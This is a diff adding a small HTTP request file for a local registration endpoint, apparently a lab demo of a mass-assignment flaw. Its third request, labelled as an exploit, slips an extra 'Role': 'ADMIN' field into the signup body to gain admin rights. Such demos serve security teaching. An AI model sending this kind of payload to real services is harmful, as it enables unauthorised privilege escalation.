@@ -1,0 +1,21 @@
+### Test
+GET http://localhost:3000/ HTTP/1.1
+
+### legitimate request
+POST http://localhost:3000/register HTTP/1.1
+content-type: application/json
+
+{
+    "username": "johngreen",
+    "email": "johngreen@example.com"
+}
+
+### unexpected request for exploiting mass assignemt vlun
+POST http://localhost:3000/register HTTP/1.1
+content-type: application/json
+
+{
+    "username": "hankgreen",
+    "email": "hankgreen@example.com",
+    "Role": "ADMIN"
+}
